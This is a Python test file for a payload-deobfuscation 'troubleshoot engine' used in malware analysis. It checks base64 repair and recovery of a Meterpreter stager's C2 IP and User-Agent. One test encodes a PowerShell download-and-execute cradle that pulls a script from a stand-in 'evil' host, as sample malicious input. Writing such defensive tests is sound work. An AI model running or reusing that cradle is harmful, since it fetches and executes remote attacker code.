"""Regression tests for the Universal Troubleshoot Engine (offline mode).

These tests pin the deterministic troubleshoot pipeline against the failure
modes the user cares about: base64 corruption, missing archetype match,
truncated gzip, and the headline Meterpreter stager IOC recovery.
"""
from __future__ import annotations
import base64
import gzip
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import operations, ops_extended  # noqa: F401 — register op registry

from troubleshoot_engine import troubleshoot


# ─── Empty input ─────────────────────────────────────────────────────────
def test_troubleshoot_empty_input_returns_gracefully():
    r = troubleshoot("")
    assert r["success"] is False
    codes = [d["code"] for d in r["diagnoses"]]
    assert "EMPTY_INPUT" in codes
    assert r["final_output"] == ""


# ─── Plaintext (nothing to decode) ───────────────────────────────────────
def test_troubleshoot_plaintext_no_fixes_needed():
    r = troubleshoot("just plain english with nothing to decode")
    # No fixes needed — the engine reports OK
    assert r["success"] is True or r["final_output"] == ""
    # Never crashes on plaintext
    assert isinstance(r["diagnoses"], list)


# ─── Corrupted base64 (4n+1 length) auto-repairs ─────────────────────────
def test_troubleshoot_repairs_corrupted_base64():
    payload = "IEX(New-Object Net.WebClient).DownloadString('http://evil/x.ps1')"
    b64 = base64.b64encode(payload.encode("utf-16-le")).decode()
    # Corrupt: append stray char (length 4n+1)
    corrupted = f"powershell.exe -EncodedCommand {b64}X"
    r = troubleshoot(corrupted)
    # The deterministic pipeline should still recover the plaintext
    assert "IEX" in (r["final_output"] or "") or "evil" in (r["final_output"] or "")


# ─── The headline case: Meterpreter stager → C2 + UA recovered ───────────
def test_troubleshoot_meterpreter_stager_recovers_c2_and_ua():
    fixture = os.path.join(os.path.dirname(__file__), "fixtures",
                           "meterpreter_gzip_xor_stager.txt")
    with open(fixture) as f:
        payload = f.read().strip()

    r = troubleshoot(payload)

    assert r["success"] is True
    assert r["reached_shellcode"] is True
    # Chained archetype must have fired
    assert r["final_engine"] and r["final_engine"].startswith("archetype:")
    # Terminal bytes contain both IOCs
    out_bytes = r["final_output"].encode("latin-1", errors="replace")
    assert b"149.28.81.19" in out_bytes, "C2 IP missing from troubleshoot output"
    assert b"Mozilla/5.0" in out_bytes, "User-Agent missing from troubleshoot output"


# ─── Recipe was too shallow — troubleshoot deepens it ─────────────────────
def test_troubleshoot_deepens_shallow_recipe():
    """User had a 1-op recipe on the MSF stager; troubleshoot should deepen it."""
    fixture = os.path.join(os.path.dirname(__file__), "fixtures",
                           "meterpreter_gzip_xor_stager.txt")
    with open(fixture) as f:
        payload = f.read().strip()

    # Simulate the analyst having applied only 1 op (extract-b64) manually
    shallow = [{"op": "extract-b64", "args": {}}]
    r = troubleshoot(payload, current_steps=shallow)

    codes = [d["code"] for d in r["diagnoses"]]
    assert "RECIPE_TOO_SHALLOW" in codes or "ARCHETYPE_MISSED" in codes
    assert len(r["final_steps"]) > len(shallow)
    assert any(d["auto_fixed"] for d in r["diagnoses"])
    assert r["fixes_applied"], "expected at least one auto-fix"


# ─── Human summary always renders as English ─────────────────────────────
def test_troubleshoot_human_summary_populated():
    r = troubleshoot("just plaintext")
    assert isinstance(r["human_summary"], str) and r["human_summary"]
    r2 = troubleshoot("")
    assert isinstance(r2["human_summary"], str) and "paste" in r2["human_summary"].lower()
